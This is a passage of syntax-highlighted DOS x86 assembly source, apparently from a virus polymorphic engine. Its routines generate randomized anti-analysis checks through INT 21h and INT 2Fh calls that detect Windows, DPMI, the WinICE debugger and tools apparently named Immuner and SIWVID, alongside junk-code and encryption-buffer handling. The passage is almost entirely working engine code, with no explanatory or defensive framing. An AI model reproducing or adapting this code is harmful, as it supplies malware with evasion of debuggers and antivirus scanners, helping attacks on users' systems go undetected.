        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    AX,54XXH</span><span class="sc0">
</span><span class="sc1">;INT    21H</span><span class="sc0">
</span><span class="sc1">;CMP    AL,1/2</span><span class="sc0">
</span><span class="sc1">;JBE    @@OK/JB @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc5">TRICK_4</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">54H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_AH</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">CMP_JBX_AL</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    AX,5802H</span><span class="sc0">
</span><span class="sc1">;INT    21H</span><span class="sc0">
</span><span class="sc1">;CMP    AL,1/2</span><span class="sc0">
</span><span class="sc1">;JBE    @@OK/JB @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc5">TRICK_5</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">5802H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_AX</span><span class="sc0">
</span><span class="sc5">CMP_JBX_AL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_INT21</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">76H</span><span class="sc0">              </span><span class="sc1">;JBE</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GO_CMP_JXX_AL</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    AX,1600H</span><span class="sc0">
</span><span class="sc1">;INT    2FH</span><span class="sc0">
</span><span class="sc1">;CMP    AL,4/CMP AL,3</span><span class="sc0">
</span><span class="sc1">;JAE    @@OK/JA @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc5">TRICK_6</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_WIN</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">CMP_JAX_AL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">73H</span><span class="sc0">              </span><span class="sc1">;JAE</span><span class="sc0">
</span><span class="sc5">GO_CMP_JXX_AL</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">CMP_JXX_AL</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    AX,1200H</span><span class="sc0">
</span><span class="sc1">;INT    2FH</span><span class="sc0">
</span><span class="sc1">;CMP    AL,0FFH</span><span class="sc0">
</span><span class="sc1">;JE @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc5">TRICK_7</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1200H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GEN_CODE</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    AX,4300H</span><span class="sc0">
</span><span class="sc1">;INT    2FH</span><span class="sc0">
</span><span class="sc1">;CMP    AL,80H</span><span class="sc0">
</span><span class="sc1">;JE @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc5">TRICK_8</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4300H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">
</span><span class="sc5">GEN_CODE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_INT2F</span><span class="sc0">
</span><span class="sc5">CMP_JE_AL</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,(</span><span class="sc2">74H</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">_AL</span><span class="sc0">       </span><span class="sc1">;JE</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">CHECK_REG</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    AX,160AH</span><span class="sc0">
</span><span class="sc1">;INT    2FH</span><span class="sc0">
</span><span class="sc1">;AND    AX,AX</span><span class="sc0">
</span><span class="sc1">;JE @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc5">TRICK_9</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc0">
</span><span class="sc5">COMMON_CODE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_WIN</span><span class="sc0">
</span><span class="sc5">CMP_JE_AX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,(</span><span class="sc2">74H</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">_AX</span><span class="sc0">       </span><span class="sc1">;JE</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">OR_JXX</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    AX,1687H</span><span class="sc0">
</span><span class="sc1">;INT    2FH</span><span class="sc0">
</span><span class="sc1">;AND    AX,AX</span><span class="sc0">
</span><span class="sc1">;JE @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc1">;PUSH   CS</span><span class="sc0">
</span><span class="sc1">;POP    ES</span><span class="sc0">
</span><span class="sc5">TRICK_10</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">87H</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">COMMON_CODE</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">RESTORE_ES</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    BX,X</span><span class="sc0">
</span><span class="sc1">;MOV    AX,1684H</span><span class="sc0">
</span><span class="sc1">;INT    2FH</span><span class="sc0">
</span><span class="sc1">;AND    DI,DI</span><span class="sc0">
</span><span class="sc1">;JE @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc1">;PUSH   CS</span><span class="sc0">
</span><span class="sc1">;POP    ES</span><span class="sc0">
</span><span class="sc5">TRICK_14</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">BCHECKER_ID</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GEN_DAPI_EP</span><span class="sc0">
</span><span class="sc5">TRICK_15</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">IMMUNER_ID</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GEN_DAPI_EP</span><span class="sc0">
</span><span class="sc5">TRICK_16</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">SIWVID_ID</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GEN_DAPI_EP</span><span class="sc0">
</span><span class="sc5">TRICK_11</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">WINICE_ID</span><span class="sc0">
</span><span class="sc5">GEN_DAPI_EP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">_BX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_WREG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">84H</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_WIN</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,(</span><span class="sc2">74H</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">_DI</span><span class="sc0">       </span><span class="sc1">;JE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OR_JXX_FREE</span><span class="sc0">
</span><span class="sc5">RESTORE_ES</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DIRTY_SREG</span><span class="sc4">,</span><span class="sc5">_ES</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">RESTORE_SREG</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;CALL   @@OK</span><span class="sc0">
</span><span class="sc1">;DB $...</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc1">;POP    DX</span><span class="sc0">
</span><span class="sc1">;MOV    AX,900H</span><span class="sc0">
</span><span class="sc1">;INT    21H</span><span class="sc0">
</span><span class="sc5">TRICK_12</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">SHIT_FLAG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">ENCRYPT_BUFF</span><span class="sc4">-</span><span class="sc2">100H</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_CALL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">SHIT_FLAG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc12">'$'</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">5AH</span><span class="sc0">              </span><span class="sc1">;POP DX</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">_DX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">USED_WREG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DIRTY_SREG</span><span class="sc4">,</span><span class="sc5">_ES</span><span class="sc0">
</span><span class="sc5">GEN_INT21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">INT_XX</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;XOR    BX,BX</span><span class="sc0">
</span><span class="sc1">;MOV    AX,1683H</span><span class="sc0">
</span><span class="sc1">;INT    2FH</span><span class="sc0">
</span><span class="sc1">;AND    BX,BX</span><span class="sc0">
</span><span class="sc1">;JNE    @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc5">TRICK_13</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">_BX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_ZERO16</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">83H</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_WIN</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,(</span><span class="sc2">75H</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">_BX</span><span class="sc0">       </span><span class="sc1">;JNE</span><span class="sc0">
</span><span class="sc5">OR_JXX_FREE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DIRTY_WREG</span><span class="sc0">   </span><span class="sc1">;FREE _AX</span><span class="sc0">
</span><span class="sc5">OR_JXX</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">CHECK_REG</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    BX,X    ;ENUM   {STDIN,STDOUT,STDERR}</span><span class="sc0">
</span><span class="sc1">;MOV    AX,4407H</span><span class="sc0">
</span><span class="sc1">;INT    21H</span><span class="sc0">
</span><span class="sc1">;CMP    AL,0FFH</span><span class="sc0">
</span><span class="sc1">;JE @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc5">TRICK_17</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">_BX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_WREG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4407H</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">CMP_JE_AL</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GEN_INT21</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    AX,4A04H/1612H</span><span class="sc0">
</span><span class="sc1">;INT    2FH</span><span class="sc0">
</span><span class="sc1">;AND    AX,AX</span><span class="sc0">
</span><span class="sc1">;JE @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc1">;PUSH   CS</span><span class="sc0">
</span><span class="sc1">;POP    ES</span><span class="sc0">
</span><span class="sc5">TRICK_18</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4A04H</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">INT2F_ES</span><span class="sc0">
</span><span class="sc5">TRICK_19</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1612H</span><span class="sc0">
</span><span class="sc5">INT2F_ES</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_INT2F</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CMP_JE_AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">RESTORE_ES</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">VIA_INT21_0</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
</span><span class="sc5">GEN_INT21_1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_AH</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GEN_INT21</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">VIA_INT21_4C</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">4CH</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GEN_INT21_1</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: CL=CHECK NUMBER/BH=JAE/JBE</span><span class="sc0">
</span><span class="sc5">CMP_JXX_AL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">               </span><span class="sc1">;AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">CHECK_REG</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">;JA/JB</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">IS_JA</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">12H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">IS_JA</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: BL=REG NUMBER</span><span class="sc0">
</span><span class="sc1">;       BH=JXX CODE (JA/JAE/JB/ETC)</span><span class="sc0">
</span><span class="sc1">;       CX=CHECK NUMBER (IF CX=0 THEN ASSUME THAT REG IS WORD,</span><span class="sc0">
</span><span class="sc1">;                        IF CX!=0 THEN ASSUME THAT REG IS AL)</span><span class="sc0">
</span><span class="sc1">;1. CMP</span><span class="sc0">
</span><span class="sc1">;2. IF CX=0: OR/TEST/AND</span><span class="sc0">
</span><span class="sc5">CHECK_REG</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">USED_WREG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc5">GET_METHOD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">GET_METHOD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_CMP_IMM</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">IS_NOT_AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">IS_NOT_AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3DH</span><span class="sc0">              </span><span class="sc1">;CMP AX</span><span class="sc0">
        </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc5">IS_CMP_WORD</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">STORE_BYTE</span><span class="sc0">
</span><span class="sc5">IS_NOT_AX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0F883H</span><span class="sc0">           </span><span class="sc1">;CMP REG16,IMM8</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc5">IS_CMP_WORD</span><span class="sc0">
